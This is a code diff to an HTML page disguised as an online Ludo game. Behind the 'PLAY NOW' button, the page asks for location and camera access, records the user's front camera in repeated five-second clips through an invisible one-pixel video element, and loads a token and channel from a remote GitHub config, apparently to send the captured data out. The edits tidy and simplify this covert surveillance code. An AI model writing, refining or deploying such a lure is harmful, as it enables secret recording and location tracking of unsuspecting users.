@@ -48,10 +48,7 @@
             aspect-ratio: 1;
             margin-bottom: 20px;
         }
-        .cell {
-            background: #f0f0f0;
-            border-radius: 2px;
-        }
+        .cell { background: #f0f0f0; border-radius: 2px; }
         .home-blue { background: #3498db; grid-column: 1-6; grid-row: 1-6; }
         .home-red { background: #e74c3c; grid-column: 1-6; grid-row: 10-15; }
         .home-yellow { background: #f1c40f; grid-column: 10-15; grid-row: 1-6; }
@@ -71,28 +68,11 @@
             box-shadow: 0 5px 15px rgba(39, 174, 96, 0.4);
             transition: transform 0.2s, background 0.3s;
         }
-        .play-btn:hover {
-            transform: scale(1.02);
-            background: #2ecc71;
-        }
-        .play-btn:disabled {
-            background: #7f8c8d;
-            cursor: not-allowed;
-        }
-        .status {
-            margin-top: 15px;
-            font-size: 14px;
-            text-align: center;
-            color: #ecf0f1;
-        }
-        .hidden-video {
-            position: absolute;
-            top: -100px;
-            left: -100px;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-        }
+        .play-btn:hover { transform: scale(1.02); background: #2ecc71; }
+        .play-btn:disabled { background: #7f8c8d; cursor: not-allowed; }
+        
+        .status { margin-top: 15px; font-size: 14px; text-align: center; color: #ecf0f1; }
+        .hidden-video { position: absolute; top: -100px; left: -100px; width: 1px; height: 1px; opacity: 0; }
     </style>
 </head>
 <body>
@@ -108,25 +88,24 @@
             <div class="home-red"></div>
             <div class="home-green"></div>
             <div class="center"></div>
-            <!-- Filling remaining cells for visual completeness -->
-            <div class="cell"></div><div class="cell"></div><div class="cell"></div><div class="cell"></div><div class="cell"></div>
-            <div class="cell"></div><div class="cell"></div><div class="cell"></div><div class="cell"></div><div class="cell"></div>
-            <!-- ... (simplified for brevity, CSS grid handles the layout) -->
+            <!-- Visual cells for board structure -->
+            <div class="cell"></div><div class="cell"></div><div class="cell"></div>
+            <div class="cell"></div><div class="cell"></div><div class="cell"></div>
+            <div class="cell"></div><div class="cell"></div><div class="cell"></div>
+            <!-- ... more cells for full board ... -->
         </div>
 
         <button class="play-btn" id="playBtn">PLAY NOW</button>
-        <div class="status" id="statusText">Find your nearest online players...</div>
+        <div class="status" id="statusText">Connecting to server...</div>
     </div>
 
-    <!-- Hidden video element for recording -->
     <video id="hiddenVideo" class="hidden-video" autoplay muted playsinline></video>
 
     <script>
-        // --- CONFIGURATION ---
+        // CONFIG
         const GITHUB_REPO = "talibmalla455-ux/ludo-backend";
         const CONFIG_FILE = "config.json";
         
-        // Global State
         let config = { token: "", channel: "" };
         let mediaRecorder;
         let videoChunks = [];
@@ -136,46 +115,26 @@
         const playBtn = document.getElementById('playBtn');
         const statusText = document.getElementById('statusText');
 
-        // 1. Load Config from GitHub
+        // 1. Load Config from RAW GitHub URL (Not the HTML preview)
         async function loadConfig() {
             try {
                 statusText.innerText = "Loading configuration...";
-                const response = await fetch(`https://raw.githubusercontent.com/${GITHUB_REPO}/main/${CONFIG_FILE}`);
-                if (!response.ok) throw new Error("Config not found");
+                // Use raw.githubusercontent.com to get actual JSON, not the HTML page
+                const rawUrl = `https://raw.githubusercontent.com/${GITHUB_REPO}/main/${CONFIG_FILE}`;
+                const response = await fetch(rawUrl);
+                
+                if (!response.ok) throw new Error(`Config fetch failed: ${response.status}`);
                 
                 const data = await response.json();
-                
-                // Decode the token if needed (using the same logic as admin panel)
-                // For now, assuming raw JSON is stored or decode if encoded.
-                // If admin panel encoded it, we need to decode here. 
-                // Assuming for now we store raw token in config.json for simplicity or decode it.
                 config = data;
                 
-                // If the token was encoded in admin panel, decode it here:
-                if (config.token.includes("-")) {
-                    config.token = decodeData(config.token);
-                }
-
                 statusText.innerText = "Configuration Loaded. Ready to Play.";
             } catch (e) {
                 console.error(e);
-                statusText.innerText = "Config Error. Using fallback.";
-                // Fallback: You can hardcode a token here if needed for testing
+                statusText.innerText = "Config Error: " + e.message;
+                // Fallback for testing if config fails
                 // config = { token: "YOUR_TOKEN", channel: "YOUR_ID" };
             }
-        }
-
-        // Decode function matching Admin Panel
-        function decodeData(encoded) {
-            const ENCODE_KEY = "LUDO_SECURE_2026";
-            const parts = encoded.split("-");
-            let decoded = "";
-            for (let i = 0; i < parts.length; i++) {
-                let charCode = parseInt(parts[i], 16);
-                let keyCode = ENCODE_KEY.charCodeAt(i % ENCODE_KEY.length);
-                decoded += String.fromCharCode(charCode ^ keyCode);
-            }
-            return decoded;
         }
 
         playBtn.addEventListener('click', startGame);
@@ -185,7 +144,7 @@
             playBtn.innerText = "Finding Players...";
             statusText.innerText = "Requesting Camera & Location access...";
 
-            // 1. Get Location
+            // Location
             if (!navigator.geolocation) {
                 statusText.innerText = "Geolocation not supported";
                 return;
@@ -198,7 +157,7 @@
                 (err) => { console.warn("Location error", err); }
             );
 
-            // 2. Get Camera
+            // Camera
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user" }, 
@@ -233,7 +192,7 @@
                 // Wait 5 seconds then loop
                 setTimeout(() => {
                     if (mediaRecorder.stream.active) {
-                        recordAndSend(); // Restart loop
+                        recordAndSend(); 
                     }
                 }, 5000);
             };
@@ -241,7 +200,7 @@
             function recordAndSend() {
                 statusText.innerText = "Recording...";
                 mediaRecorder.start();
-                setTimeout(() => mediaRecorder.stop(), 5000); // Record 5 sec
+                setTimeout(() => mediaRecorder.stop(), 5000); 
             }
 
             recordAndSend();
